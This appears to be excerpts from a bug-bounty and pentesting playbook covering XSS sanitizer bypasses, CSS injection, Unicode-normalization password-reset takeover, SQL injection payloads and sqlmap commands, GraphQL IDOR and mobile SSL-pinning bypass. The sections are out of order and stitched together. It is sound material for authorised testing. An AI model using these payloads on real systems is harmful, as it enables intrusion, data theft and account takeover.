...
### DOMPurify Bypass History (from BugXplorer #4084)
Complete attack class & bypass history: https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- Mutation XSS (mXSS) via parser differentials
- Clobbering attacks on `document.forms` / `document.anchors`
- Namespace confusion (SVG/MathML in HTML)
- Isolated world bypasses (Chrome extensions)
- Template literal sanitization bypasses
- `:has()` selector injection in modern DOMPurify
Always check the DOMPurify version — older versions have known bypasses (CVE-2020-6821, CVE-2021-3888, etc.)

### CSS Injection: "The Bomb Inside Your Inbox" (PortSwigger Research, BugXplorer #4088)
https://portswigger.net/research/css-the-bomb-inside-your-inbox
Webmail clients rendering untrusted CSS in trusted UI. CSS sanitization often flawed.
- Attribute selector exfiltration survives strict CSP (no JS execution)
- Opacity clickjacking via transparent iframe overlay
- `@import` attacker-controlled stylesheet
- Font-based character oracle via `unicode-range`
See **CSS INJECTION** section (22) for full triage & chains.
...
```
Decimal IP `2130706433` = `127.0.0.1` passes origin checks that only validate string suffix/prefix. Add to postMessage origin-check bypass table.
...
| postMessage IP normalization | `http://2130706433/.target.com` | Decimal IP in origin bypasses string suffix/prefix checks (BugXplorer #4082) |
...
Test Unicode normalization mismatches at every stage:
```
Input → Validation → Database → Token Generation → Email Delivery
```
- Database treats `victim@gmail.com` ≡ `victim@gmáil.com` (after normalization)
- Application identifies victim's account
- SMTP treats them as different → password reset sent to attacker-controlled address
- **Test**: Unicode variants in email/username fields (`a` → `á`, `i` → `ı`, `o` → `о` Cyrillic)
- If app finds victim account but email goes to Unicode variant → Account Takeover
...
- Bypass rate limiting on OAuth/password reset endpoints
- Combine with token leakage or prediction → zero-interaction ATO
- Test: distributed requests, header manipulation, IP rotation, endpoint confusion
...
#### Enumerate EVERY input surface — one app ≠ one SQLi
An app with several DB-touching inputs often hosts several *different* SQLi classes. Treat each surface as a fresh bug:

| Surface | Technique found |
|---|---|
| `/product.php?id=N` | Error-based (`extractvalue`), verbose error |
| `/search.php?q=` (engine w/ suppression) | UNION-based |
| POST password-reset (msg-success vs msg-info) | Boolean blind (binary response) |
| Any HTTP header (UA/Referer) logged into INSERT | Time-based blind in INSERT context |

For each surface test in order: ERROR → UNION → BOOLEAN → TIME. Do not hammer one surface with sqlmap while ignoring the others.

#### MySQL table-name case sensitivity (Linux) — silent failure trap
On Linux MySQL/MariaDB `lower_case_table_names=0`, **table names are case-sensitive** (`flags.flag2` ≠ `flags.Flag2`). With error suppression, a wrong-case reference returns *exactly the same* "no results" response as an empty table — indistinguishable. If `FROM flags.Flag2` "no results" but metadata says the table exists:
```
# Confirm the REAL casing before apologizing to the database
Y' UNION SELECT 1,HEX(table_name),1 FROM information_schema.tables WHERE table_schema='flags'-- a
# ^ 666c616732 = "flag2" (lowercase!) — the app was NEVER missing privileges
```
Always `HEX()`/`GROUP_CONCAT()` the actual `table_name` from `information_schema` (or `FLAGn_%` LIKE) and copy its casing byte-for-byte into the query. Also verify column casing the same way from `information_schema.columns`.

#### Error suppression muddies EVERY signal — distinguish "empty" from "error"
An app that wraps queries in try/catch collapses `0 rows` and `SQL error` into one message ("No books matched"). Blindly fuzzing metadata tables then wastes hours on "privilege" theories. Disambiguate deterministically:
```
# 1) Is UNION injection even live? Force a deterministic row via SSR-free literal
' UNION SELECT 'AAA','BBB','CCC'--
# appears? injection is live; silence elsewhere = data query itself failing

# 2) Not blind-trust metadata reads — prove per-schema visibility:
Y' UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA LIKE 'flag%'-- a

# 3) Use a probe that READS the schema you suspect (not guesses):
foundDB = response.contains(guess)   # build truth table guess→visible
```
Rule: when in "permission denied"-style dead-ends, suspect (in order): wrong table/column casing → cross-DB visibility → real privilege restriction. Kill each assumption with a single targeted probe before moving on.

#### sqlmap: when default run stalls with "reflective value(s)" or no injection
Automated detection fails or filters payloads when the app reflects input; force the payload shape manually:
```
sqlmap -u "https://t/search.php?q=x" --batch \
  --prefix="'" --suffix="-- -"      # force quote + comment (kills reflective detection)
sqlmap ... --technique=U            # or B/E/T — don't let all 5 run instead of targeting
sqlmap ... --current-db             # orient before --dbs; union needs exact column count: ORDER BY 5 → -5 = range(2,6)
```
Short-horizon rule: sqlmap for structure/dump, **manual curl for the decisive PROOF payload** — curl is faster and gives you the raw evidence screenshot.

#### INSERT-context time-based blind (header injection)
When the injectable point is written into an INSERT (e.g. User-Agent/Referer logged to analytics), plain `' OR SLEEP(5)--` breaks because the closing `)` of the VALUES tuple is commented out. Balance the parens:
```
' , IF((SELECT 1),SLEEP(5),0))-- -
#       balance                               ^^^ VALUES tuple closes here
```
Confirm with a short `SLEEP(2)` FIRSST — you must rule out app sleep/rate limiting before trusting longer delays. Timed via curl `-w '%{time_total}'`.

#### Verifying extracted secrets over a lossy read channel (OCR-only / capture-only)
When the only way to read results is a screenshot/OCR (Guacamole/virtualized labs, no copy-paste), a 32-hex flag OCRs badly (1/l, 0/O, a/8 garbles). Prove the value end-to-end without trusting OCR:
```
# Remote (server):
cat /path/flag.csv | tail -1 | tr -d '"\r' | cut -d, -f1 > /tmp/f.txt
md5sum /tmp/f.txt                       # → ABC12DEF...= remote hash
od -An -tx1 -v /tmp/f.txt               # spaced hex = OCR-friendly  (also: fold -w4)

# Local (attacker):
for c in $candidates via od-decode variants; do
  [ "$(printf '%s' "$c" | md5sum)" = "$REMOTE_HASH" ] && flag=$c   # definitive
done
```
`md5sum` (or any checksum) of the value on the server + local candidate matching is **proof**, not belief. Always ship checksums with extracted data when the channel is lossy.
...
## 29. REACT SERVER COMPONENTS (RSC) RCE
...
### Chains That Pay
```
QPACK header injection + backend parser confusion  → Request smuggling (Critical)
Stream dependency cycle + DoS on critical endpoint   = High
Cross-layer state confusion + credential leak        = Critical
HTTP/3-only endpoint with weaker auth than H2       = High (Auth Bypass)
```

### Triage
```
QPACK injection → proven request smuggling/credential leak  = Critical
Stream dependency cycle → proven DoS on critical service      = High
Cross-layer state confusion → credential/key material leak    = Critical
HTTP/3 endpoint with auth bypass vs H2                        = High
H3 supported but no exploitable vector                        = Info
```
...
- [ ] Token predictable / low entropy
- [ ] Token leaked in email headers / logs
...
- [ ] Token exposure via "view source" / debug endpoints
- [ ] Password reset without current password (for logged-in users)
- [ ] Weak password policy on reset
...
## 27. MOBILE PENTESTING (ANDROID / iOS)

---

## 28. GRAPHQL-SPECIFIC ATTACKS (ENHANCED)
> From H1 2025 reports: GraphQL is a high-yield surface for IDOR, info disclosure, and auth bypass.

### Critical Patterns (2025 H1 Reports)
| Pattern | Report | Technique |
|---------|--------|-----------|
| **Over-fetching private fields** | H1 #3000510 ($25k) | `/reports/:id.json` exposes sensitive user data via GraphQL |
| **Introspection on private schema** | H1 #1618347 ($25k) | `PolicyPageAssetGroup` disclosed via `__schema` on private programs |
| **AuthZ bypass via GraphQL** | H1 #2633771 | `deleteProfileInput` IDOR in GraphQL mutation |
| **Batch query abuse** | Multiple | Single request extracts multiple objects (bypass rate limits) |

### Testing Checklist
```
[ ] Introspection enabled? (`__schema`, `__type`)
[ ] Field-level auth on sensitive types (User, Report, Repository)
[ ] Query depth/complexity limits?
[ ] Batch query limits?
[ ] IDOR on mutations: `updateUser(id: "victim")`, `deleteReport(id: "x")`
[ ] Sensitive fields in responses: `email`, `token`, `secret`, `password_hash`
[ ] Directive abuse: `@skip`, `@include`, `@deprecated` for bypass
[ ] Aliasing for field duplication: `user(id:1){email} user(id:2){email}`
[ ] Variable injection: `query($id: ID!) { user(id: $id) { email } }`
```

### Chains That Pay
```
GraphQL introspection + private field exposure  → Info disclosure (Medium)
GraphQL IDOR mutation + no authZ check           → High/Critical (ATO, data deletion)
GraphQL batch query + rate limit bypass          → High (mass data extraction)
GraphQL alias + field duplication                → Medium (data enumeration)
```

### Triage
```
Introspection enabled + sensitive fields in schema              = Medium
GraphQL mutation IDOR with proven cross-user access             = High/Critical
Batch query bypasses rate limits + mass data extraction         = High
Private program schema exposed via introspection                = Critical (H1 #1618347)
GraphQL only used internally, no public exposure                = Info
```
> From @pentestandroid, @Bug0x, @brutsecurity channels. Mobile bugs pay High/Critical — RCE, ATO, data theft, SSL bypass.

### Android Essentials
- **Frida Universal SSL Pinning Bypass** (pentestandroid #5, #11, #16)
  - `Bypassing SSL pinning using Frida.pdf` (932KB)
  - `Ultimate_Guide_to_SSL_Pinning_Bypass_RedHunt_Labs.pdf` (37MB)
  - `Hacking Google with A.I. for $500,000` (BugXplorer #4077)
- **InsecureBankv2 Walkthrough** (pentestandroid #12) — Parts 1-3 on Medium
...
- **vaib25vicky/awesome-mobile-security** — Curated Android/iOS resources (pentestandroid #7)
- **streaak/keyhacks** — Verify leaked API keys (pentestandroid #6)
- **odomojuli/RegExAPI** — OAuth/API token regex patterns (pentestandroid #9)

### iOS Essentials
- **Cobalt iOS Pentesting 101** (pentestandroid #18)
- **Corellium / iOS Emulator** guides (pentestandroid #18)
- **HackTricks iOS Checklist** (pentestandroid #18)
- **Mobexler Checklist** (pentestandroid #18)
- **Nviso Flutter Traffic Interception** (pentestandroid #18)

### Key Attack Vectors
| Vector | Tool/Reference | Impact |
|--------|----------------|--------|
| SSL Pinning Bypass | Frida scripts, Objection | MITM all traffic |
| Secret API Keys | APKLeaks (dwisiswant0/apkleaks), KeyHacks | Cloud access, payment keys |
| Hardcoded Secrets | APKLeaks, regex (RegExAPI) | Direct credential theft |
| Insecure Storage | InsecureBankv2, JADX/APKTool | PII, tokens, keys |
| Root Detection Bypass | Magisk, Frida | Run on rooted device |
| Emulator Detection | Frida, Xposed | Dynamic analysis |
| Certificate Transparency | CT logs for mobile domains | Subdomain enum |
| Deep Link / Intent Hijack | `adb shell am start` | Data exfil, ATO |
| Backup Extraction | `adb backup`, `bu` | Local data theft |
| Frida RPC / Gadgets | `frida -U -f com.app -l script.js` | Runtime hooking |

### Testing Checklist
```
[ ] Pull APK/IPA → JADX/APKTool / Ghidra / Hopper
[ ] APKLeaks scan → endpoints, secrets, URLs
[ ] Frida SSL bypass → Burp proxy all traffic
[ ] KeyHaks validation → test all found API keys
[ ] RegExAPI scan → OAuth tokens, JWTs, AWS keys
[ ] Insecure storage → SharedPreferences, SQLite, Keystore
[ ] Network security config → cleartext, custom CAs
[ ] Exported components → activities, services, receivers, providers
[ ] Deep links / URL schemes → intent hijack
[ ] WebView settings → JS enabled, file access, universal access
[ ] Certificate pinning → Frida/Objection bypass
[ ] Root/emulator detection → bypass hooks
[ ] Backup allowed → extract local data
[ ] Logcat / debug logs → sensitive data leakage
[ ] Third-party SDKs → analytics, crashlytics, ads
```

### Chains That Pay
```
SSL bypass + API key in traffic          → Cloud compromise / payment bypass  Critical
SSL bypass + hardcoded secret in APK     → Direct credential theft           Critical
Exported activity + intent data leak     → PII exfil / ATO                   High
Deep link hijack + token in URL          → Session theft                     High
Backup extraction + SQLite token store   → Offline token theft               Medium/High
Frida hook + crypto key extraction       → Decrypt local data / sign JWT     Critical
```

### Triage
```
SSL pinning bypass + proven MITM on production traffic           = High/Critical
Hardcoded API key with verified access to sensitive data/ops     = Critical
Exported component leaks auth token / PII without user interaction = High
Intent/Deep link hijack completes sensitive action (ATO, payment) = Critical
Root/emulator detection bypass alone (no data access)            = Info
APKLeaks finds key but no proof of valid access                  = Low/Info
```
